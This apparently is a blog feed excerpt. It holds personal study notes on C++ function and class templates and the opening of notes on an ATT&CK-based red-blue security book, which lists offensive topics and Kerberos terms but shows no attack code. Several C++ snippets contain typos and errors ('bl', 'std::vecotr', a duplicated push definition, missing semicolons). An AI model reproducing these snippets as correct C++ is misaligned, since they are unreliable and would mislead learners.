class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename RT = long, typename T1, typename T2&gt;<br>RT max(T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br><br>int i;<br>long l;<br>...<br>max(i, l); //returns long(default argument of template parameter for returns type).<br>max&lt;int&gt;(4, 42); //returns int as explicitly requested<br></code></pre></td></tr></table></figure></p><h2 id="1-5-Overloading-Function-Templates"><a href="#1-5-Overloading-Function-Templates" class="headerlink" title="1.5 - Overloading Function Templates"></a>1.5 - Overloading Function Templates</h2><p>Like ordinary functions, function templates can be overloaded. That is, you can have different function difinitions with the same function name so that when that name is used in a function call, a C++ compiler must decide which one of the various candidates to call.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//maximum of two int values:<br>int max(int a, int b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br><br>//maximum of two values of any type:<br>template&lt;typename T&gt;<br>T max(T a, T b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br><br>int main()<br>&#123;<br>  ::max(7, 42); // calls the nontemplate for two ints<br>  ::max(7.0, 42.0); // calls max&lt;double&gt; (by argument deduction)<br>  ::max(&#x27;a&#x27;, &#x27;b&#x27;); // calls max&lt;char&gt; (by argument deduction)<br>  ::max&lt;&gt;(7, 42); // calls max&lt;int&gt; (by argument deduction)<br>  ::max&lt;double&gt;(7, 42); // calls max&lt;double&gt; (no argument deduction)<br>  ::max(&#x27;a&#x27;, 42.7); // calls the nontemplate for two ints<br>&#125;<br></code></pre></td></tr></table></figure><p>If the template can generate a function with a better match, however, <strong>then the template is selected</strong>.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">::max(7.0, 42.0); // calls the max&lt;double&gt; (by argument deduction)<br>::max(&#x27;a&#x27;, &#x27;b&#x27;); // calls the max&lt;char&gt; (by argument deduction)<br></code></pre></td></tr></table></figure><br>Here, the template is a better match because <strong>no conversion from double or char to int is required</strong>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">::max(&#x27;a&#x27;, 42.7);<br></code></pre></td></tr></table></figure><p>Because automatic type conversion is not considered for deduced template parameters but is considered for ordinary function parameters, the last call uses the nontemplate function(while <code>a</code> and <code>42.7</code> both converted to <code>int</code>).</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>auto max (T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br>template&lt;typename RT, typename T1, typename T2&gt;<br>RT max (T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><p>New, we can call <code>max()</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auto a = ::max(4, 7.2); //uses first template.<br>auto b = ::max&lt;long double&gt;(7.2, 4); //uses second template, since the number of parameters is not matched for first template.<br>auto c = ::max&lt;int&gt;(4, 7.2); //ERROR: both function templates match.<br></code></pre></td></tr></table></figure></p><hr><p>A useful example would be to overload the maximum template for pointers and ordinary C-strings:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;cstring&gt;<br>#include &lt;string&gt;<br><br>//maximum of two values of any type:<br>template&lt;typename T&gt;<br>T max(T a, T b)<br>&#123;<br>  return b &lt; a ? a : bl<br>&#125;<br><br>//maximum of two pointers:<br>template&lt;typename T&gt;<br>T* max(T *a, T *b)<br>&#123;<br>  return *b &lt; *a ? a : b;<br>&#125;<br><br>//maximum of two C-strings:<br>char const* max(char const* a, char const* b)<br>&#123;<br>  return std::strcmp(b, a) &lt; 0 ? a : b;<br>&#125;<br><br>int main()<br>&#123;<br>  int a = 7;<br>  int b = 42;<br>  auto m1 = ::max(a,b); // max() for two values of type int<br>  std::string s1 = &quot;hey&quot;;<br>  std::string s2 = &quot;you&quot;;<br>  auto m2 = ::max(s1,s2); // max() for two values of type std::string<br>  int* p1 = &amp;b;<br>  int* p2 = &amp;a;<br>  auto m3 = ::max(p1,p2); // max() for two pointers<br>  char const* x = &quot;hello&quot;;<br>  char const* y = &quot;world&quot;;<br>  auto m4 = ::max(x,y); // max() for two C-strings<br>&#125;<br></code></pre></td></tr></table></figure><br>Note that in all overloads of <code>max()</code> we pass the arguments by value. In general, it is good idea not to change more than necessary when overloading function templates. You should limit your changes to the number of parameters or to specifying template parameters explicitly. Otherwise, unexpected effects may happen.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;iostream&gt;<br><br>template&lt;typename T&gt;<br>T max(T a, T b)<br>&#123;<br>  std::cout &lt;&lt; &quot;max&lt;&gt;()&quot; &lt;&lt; endl;<br>  return b &lt; a ? a : b;<br>&#125;<br><br>// maximum of three values of any type:<br>template&lt;typename T&gt;<br>T max (T a, T b, T c)<br>&#123;<br>  return max (max(a,b), c); // uses the template version even for ints<br>&#125; // because the following declaration comes<br>  // too late:<br><br>// maximum of two int values:<br>int max (int a, int b)<br>&#123;<br>  std::cout &lt;&lt; &quot;max(int,int) \n&quot;;<br>  return b &lt; a ? a : b;<br>&#125;<br>int main()<br>&#123;<br>  ::max(47,11,33); // OOPS: uses max&lt;T&gt;() instead of max(int,int)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-6-But-Shouldn’t-We…"><a href="#1-6-But-Shouldn’t-We…" class="headerlink" title="1.6 - But, Shouldn’t We…?"></a>1.6 - But, Shouldn’t We…?</h2><h3 id="Pass-by-Value-or-by-Reference"><a href="#Pass-by-Value-or-by-Reference" class="headerlink" title="Pass by Value or by Reference?"></a>Pass by Value or by Reference?</h3><h3 id="Why-not-inline"><a href="#Why-not-inline" class="headerlink" title="Why not inline?"></a>Why not inline?</h3><p>In general, function templates don’t have to be declared with inline. Unlike ordinary.<br>The only exception to this rule are full specializations of templates for specific types, so that the resulting code is no longer generic (all template parameters are defined).</p><h3 id="Why-not-constexpr"><a href="#Why-not-constexpr" class="headerlink" title="Why not constexpr?"></a>Why not constexpr?</h3><p>Since C++11, you can use constexpr to provide the ability to use code to compute some values at compile time. For a lost of templates this makes sense.</p><p>For example, to be able to use the maximum function at compile time, you have to declare it as follows:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>constexpr auto max(T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><br>With this, you can use the maximum function template in places with compile-time context, such as when declaring the size of a raw array:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int a[::max(sizeof(char), 1000u)];<br></code></pre></td></tr></table></figure><br>or the size of a <code>std::array&lt;&gt;</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::array&lt;std::string, ::max(sizeof(char), 1000u)&gt; arr;<br></code></pre></td></tr></table></figure></p><h1 id="Chapter-2-Class-Template"><a href="#Chapter-2-Class-Template" class="headerlink" title="Chapter.2 - Class Template"></a>Chapter.2 - Class Template</h1><h2 id="2-1-Implementation-of-Class-Template-Stack"><a href="#2-1-Implementation-of-Class-Template-Stack" class="headerlink" title="2.1 - Implementation of Class Template Stack"></a>2.1 - Implementation of Class Template Stack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//stack1.hpp<br>#include &lt;vector&gt;<br>#include &lt;cassert&gt;<br><br>template&lt;typename T&gt;<br>class Stack &#123;<br>private:<br>  std::vecotr&lt;T&gt; elems; //elements<br><br>public:<br>  void push(T const&amp; elem); //push element<br>  void pop(); //pop element<br><br>  T const&amp; top() const; //return top element<br>  bool empty() const &#123; //return whether the stack is empty.<br>    return elems.empty();<br>  &#125;<br>&#125;<br><br>template&lt;typename T&gt;<br>void Stack&lt;T&gt;::push (T const&amp; elem)<br>&#123;<br>  elems.push_back(elem); //append copy of passed elem<br>&#125;<br><br>template&lt;typename T&gt;<br>void Stack&lt;T&gt;::push (T const&amp; elem)<br>&#123;<br>  elems.push_back(elem);<br>&#125;<br><br>template&lt;typename T&gt;<br>void Stack&lt;T&gt;::pop()<br>&#123;<br>  assert(!elems.empty());<br>  elems.pop_back();<br>&#125;<br><br>template&lt;typename T&gt;<br>T const&amp; Stack&lt;T&gt;::top() const<br>&#123;<br>  assert(!elems.empty());<br>  return elems.back();<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>If, for example, you have to declare your own copy constructor and assignment operator, it typically looks like this:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>class Stack &#123;<br>  ...<br>  Stack (Stack const&amp;);             //copy constructor<br>  Stack&amp; operator= (Stack const&amp;);  //assignment operator<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><br>which is formally equivalent to:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>class Stack &#123;<br>  ...<br>  Stack (Stack&lt;T&gt; const&amp;);<br>  Stack&lt;T&gt;&amp; operator= (Stack&lt;T&gt; const&amp;);<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><br>but usually the <code>&lt;T&gt;</code> signals special handling of special template parameters, so it’s usually better to use the first form.</p><p>However, outside the class structure you’d need:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>bool operator== (Stack&lt;T&gt; const&amp; lhs, Stack&lt;T&gt; const&amp; rhs);<br></code></pre></td></tr></table></figure><br>Note that in place where the name and not type of the class is required, only <code>Stack</code> may be used.</p><h3 id="Implementation-of-Member-Functions"><a href="#Implementation-of-Member-Functions" class="headerlink" title="Implementation of Member Functions"></a>Implementation of Member Functions</h3><p>To define a member function of a class template, you have o specify that it is a template, and you have to use the full type qualification of the class template.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>void Stack&lt;T&gt;::push(T const&amp; elem)<br>&#123;<br>  elems.push_back(elem); //append copy of passed elem.<br>&#125;<br></code></pre></td></tr></table></figure><p>In this case, <code>push_back()</code> of the element vector is called, which appends the element at the end of the vector.</p><p>Note that <code>pop_back()</code> of vector removes the last elemtn but does not return it.<br>It is impossible to implement a completely exception-safe version of <code>pop()</code> that returns the removed. However, ignoring this danger, we could implement a <code>pop()</code> that returns the element just removed.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>T Stack&lt;T&gt;::pop()<br>&#123;<br>  assert(!elems.empty());<br>  T elem = elems.back();  //save copy of last element.<br>  elems.pop_back();       //remove last element.<br><br>  return elem;            //return copy of saved element.<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="2-2-Use-of-Class-Template-Stack"><a href="#2-2-Use-of-Class-Template-Stack" class="headerlink" title="2.2 - Use of Class Template Stack"></a>2.2 - Use of Class Template <code>Stack</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//stack1.cpp<br>#include &quot;stack1.hpp:<br>#include &lt;iostream&gt;<br>#include &lt;string&gt;<br><br>int main()<br>&#123;<br>  Stack&lt;int&gt; intStack;<br>  Stack&lt;std::string&gt; stringStack;<br><br>  //manipulate int stack<br>  intStack.push(7);<br>  std::cout &lt;&lt; intStack.top() &lt;&lt; &#x27;\n&#x27;;<br><br>  //manipulate string stack<br>  stringStack.push(&quot;hello&quot;);<br>  std::cout &lt;&lt; stringStack.top() &lt;&lt; &#x27;\n&#x27;;<br>  stringStack.pop();<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>An instantiated class template’s type can be used just like any other type.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void foo(Stack&lt;int&gt; const&amp; s)   //parameter `s` is `int` stack.<br>&#123;<br>  using IntStack = Stack&lt;int&gt;;  //IntStack is another name for `Stack&lt;int&gt;`.<br>  Stack&lt;int&gt; istack[10];        //`istack` is an array of 10 `int` stacks.<br>  IntStack istack2[10];         //`istack2` is also an array of 10 `int` stacks (same type).<br>&#125;<br></code></pre></td></tr></table></figure></p><hr><p>Template arguments may be any type, such as pointers to <code>float</code> or even stack of <code>int</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Stack&lt;float*&gt; flatPtrStack;       //stack of `float` pointers.<br>Stack&lt;Stack&lt;int&gt;&gt; intStackStack;  //stack of stack of ints.<br></code></pre></td></tr></table></figure></p><p>Note that before C++11 you had to put whitespace between the two closing template brackets:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Stack&lt;Stack&lt;int&gt; &gt; intStackStack; // OK with all C++ versions<br></code></pre></td></tr></table></figure><br>If you didn’t do this, you were using operator &gt;&gt;, which resulted in a syntax error:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Stack&lt;Stack&lt;int&gt;&gt; intStackStack; // ERROR before C++11<br></code></pre></td></tr></table></figure><br>The reason for the old behavior was that it helped the first pass of a C++ compiler to tokenize the<br>source code independent of the semantics of the code</p><h2 id="2-3-Partial-Usage-of-Class-Templates"><a href="#2-3-Partial-Usage-of-Class-Templates" class="headerlink" title="2.3 - Partial Usage of Class Templates"></a>2.3 - Partial Usage of Class Templates</h2><p>Instead of print the stack contents with <code>printOn</code> it is better to implement <code>operator&lt;&lt;</code> for the stack. However, as usual <code>operator&lt;&lt;</code> has to be implemented as nonmember function, which then could call printOn() inline:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>class Stack &#123;<br>  ...<br>  void printOn() (std::ostream&amp; strm) const &#123;<br>    ...<br>  &#125;<br><br>  friend std::ostream&amp; operator&lt;&lt; (std::ostream&amp; strm, Stack&lt;T&gt; const&amp; s) &#123;<br>    s.printOn(strm);<br>    return strm;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></p><h2 id="2-4-Friends"><a href="#2-4-Friends" class="headerlink" title="2.4 - Friends"></a>2.4 - Friends</h2><h2 id="2-5-Specializations-of-Class-Templates"><a href="#2-5-Specializations-of-Class-Templates" class="headerlink" title="2.5 - Specializations of Class Templates"></a>2.5 - Specializations of Class Templates</h2><p>Specializing class templates allows you to optimize<br>implementations for certain types or to fix a misbehavior of certain types for an instantiation of the class template.</p><p>If you specialize a class template, you must also specialize all member functions. Although it is possible to specialize a single member function of a class template, once you have done so, you can no longer specialize the whole class template instance that the specialized member belongs to.</p><p>To specialize a class template, you have to declare the class with a leading <code>template&lt;&gt;</code> and a specification of the types for which the class template is specialized. The types are used as a template argument and must be specified directly following the name of the class:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;&gt;<br>class Stack&lt;std::string&gt; &#123;<br>  ...<br>&#125;;<br></code></pre></td></tr></table></figure></p><p>For these specializations, any definition of a member function must be defined as an “ordinary” member function, which each occurence of <code>T</code> begin replaced by the specialized type:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void Stack&lt;std::string&gt;::push (std::string const&amp; elem)<br>&#123;<br>  elems.push_back(elem);<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="2-6-Partial-Specialization"><a href="#2-6-Partial-Specialization" class="headerlink" title="2.6 - Partial Specialization"></a>2.6 - Partial Specialization</h2><p>Class templates can be partially specialized. You can provide special implementations for particular circumstances, but some template parameters must still be defined by the user.</p><p>For example, we can define a special implementation of class `Stack&gt; for pointers:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &quot;stack1.hpp&quot;<br><br>template&lt;typename T&gt;<br>class Stack&lt;T*&gt; &#123;<br>private:<br>  std::vector&lt;T*&gt; elems;<br><br>public:<br>  void push(T*);<br>  T* pop();<br>  T* top() const;<br><br>  bool empty() const &#123;<br>    return elems.empty();<br>  &#125;<br>&#125;<br><br>template&lt;typename T&gt;<br>void Stack&lt;T*&gt;::push (T* elem)<br>&#123;<br>  elems.push_back(elem);<br>&#125;<br><br>template&lt;typename T&gt;<br>T* Stack&lt;T*&gt;::pop()<br>&#123;<br>  assert(!elems.empty());<br>  T* p = elems.back();<br>  elems.pop_back();<br>  return p;<br>&#125;<br><br>template&lt;typename T&gt;<br>T* Stack&lt;T*&gt;::top() const<br>&#123;<br>  assert(!elems.empty());<br>  return elems.back();<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="2-7-Default-Class-Template-Arguments"><a href="#2-7-Default-Class-Template-Arguments" class="headerlink" title="2.7 - Default Class Template Arguments"></a>2.7 - Default Class Template Arguments</h2><h2 id="2-8-Type-Aliases"><a href="#2-8-Type-Aliases" class="headerlink" title="2.8 - Type Aliases"></a>2.8 - Type Aliases</h2><h2 id="2-9-Class-Template-Argument-Deduction"><a href="#2-9-Class-Template-Argument-Deduction" class="headerlink" title="2.9 - Class Template Argument Deduction"></a>2.9 - Class Template Argument Deduction</h2><h2 id="2-10-Templatized-Aggregates"><a href="#2-10-Templatized-Aggregates" class="headerlink" title="2.10 - Templatized Aggregates"></a>2.10 - Templatized Aggregates</h2><h1 id="Chapter-3-Nontype-Template-Parameters"><a href="#Chapter-3-Nontype-Template-Parameters" class="headerlink" title="Chapter.3 - Nontype Template Parameters"></a>Chapter.3 - Nontype Template Parameters</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="http://example.com/categories/Book/"/>
    
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
    <category term="Code" scheme="http://example.com/tags/Code/"/>
    
    <category term="Programming" scheme="http://example.com/tags/Programming/"/>
    
    <category term="C++" scheme="http://example.com/tags/C/"/>
    
    <category term="Coding" scheme="http://example.com/tags/Coding/"/>
    
    <category term="Program" scheme="http://example.com/tags/Program/"/>
    
    <category term="Templates" scheme="http://example.com/tags/Templates/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Practical Guide To Red-Blue Confrontation From ATT&amp;CK</title>
    <link href="http://example.com/2026/01/05/2026-1-5-RedBlueConfrontationFromAttCk/"/>
    <id>http://example.com/2026/01/05/2026-1-5-RedBlueConfrontationFromAttCk/</id>
    <published>2026-01-04T16:11:01.000Z</published>
    <updated>2026-01-15T09:20:57.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/PracticalGuideToRedBlueConfrontationFromAttCk/libro.png'><img src="/images/books/PracticalGuideToRedBlueConfrontationFromAttCk/libro.png" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Practical Guide To Red-Blue Confrontation From ATT&amp;CK”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><p>This book introduces many practical cybersecurity attack techniques from the perspective of the MITRE ATT&amp;CK framework.</p><p>The majority of the content focuses on attack methods targeting the Windows platform, while Linux is also mentioned in several chapters.</p><p>Compared to several books that I have read before (click <a href="https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteLanPenetrationGuidelines/">this one</a>, <a href="https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NotePrivilegeEscalationTechnique/">this one</a> and <a href="https://iss4cf0ng.github.io/2026/01/01/DomainPenetration1/">this one</a>), there are overlapping topics, and most of them primarily discuss Windows security.</p><p>However, this book presents tool usage and penetration techniques in a more practical and broader manner. I believe this is a good book for strengthening your fundamental cybersecurity knowledge and skills, especially if you have already read the three books that I mentioned above.</p><p>This book including:</p><ul><li>Windows Protocols</li><li>Tunneling</li><li>Proxy/Reverse Proxy</li><li>Port Forwarding</li><li>Lateral(Horizontal) Movement</li><li>Many Many Tools</li><li>Persistence</li><li>Several well-known rootkits</li></ul><p>This book not including:</p><ul><li>The underlying principles of Windows Protocols.</li><li>The deep, underlying principles of different methods, such as, port forwarding.</li><li>The underlying principles of exploits.</li><li>How to mastering Cobalt Strike.</li></ul><p>There are typo and several mistakes about Windows Protocols, reader should study them and do the double-check with the official documents.</p><p>This book is suitable for readers who want a practical overview of offensive techniques rather than a deep understanding of underlying mechanisms.</p><p align="center" class='item-img' data-src='/images/meme/mika_smiling.png'><img src="/images/meme/mika_smiling.png" width="400"></p><h1 id="Chapter-1-Fundamentals-of-Windows-Security"><a href="#Chapter-1-Fundamentals-of-Windows-Security" class="headerlink" title="Chapter.1 - Fundamentals of Windows Security"></a>Chapter.1 - Fundamentals of Windows Security</h1><h2 id="1-1-Fundamentals-of-Windows-Authentication"><a href="#1-1-Fundamentals-of-Windows-Authentication" class="headerlink" title="1.1 - Fundamentals of Windows Authentication"></a>1.1 - Fundamentals of Windows Authentication</h2><ol><li>SSPI</li><li>SSP</li><li>Well-Known SSP<ol><li>NTLM</li><li>Kerberos</li><li>Negotiate</li><li>Security Channel</li><li>Digest Authentication</li><li>Cred SSP</li><li>Distributed Password Authentication</li><li>PKU2U</li></ol></li></ol><h2 id="1-3-Security-Authentication-Mechanism-of-Windows"><a href="#1-3-Security-Authentication-Mechanism-of-Windows" class="headerlink" title="1.3 - Security Authentication Mechanism of Windows"></a>1.3 - Security Authentication Mechanism of Windows</h2><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><ul><li>Ports used by Kerberos:<ol><li>TCP/UDP 88: Authentication and Tickets</li><li>TCP/UDP 464: Kerberos Kpaswd(Reset Password) protocol.</li><li>LDAP: 389</li><li>LDAPS: 636</li></ol></li></ul><p>Terminology of Kerberos<br>| Term | Meaning |<br>| —- | —- |<br>| AS | Authentication Service. |<br>| KDC | Key Distrubution Center. (Domain controller, the most important server in a domain). |<br>| TGT | Ticket Granting Ticket. |<br>| TGS | Ticket Granting Service. |<br>| ST | Service Ticket. |<br>| krbtgt | Every domain has account for <strong>krbtgt</strong>. |<br>| Principal | A unique identity to which Kerberos can assign tickets. |<br>| PAC | Privilege Attribute Certificate. |<br>| SPN | Servic Principal Name. |<br>| Session Key | A temporary key. |<br>| Server Session Key | A temporary key. |<br>| Authenticator | Encryted with Session Key. |<br>| Replay Cache | It has added since Kerberos 5. |</p><h3 id="An-Overview-of-Kerberos-Authentication"><a href="#An-Overview-of-Kerberos-Authentication" class="headerlink" title="An Overview of Kerberos Authentication"></a>An Overview of Kerberos 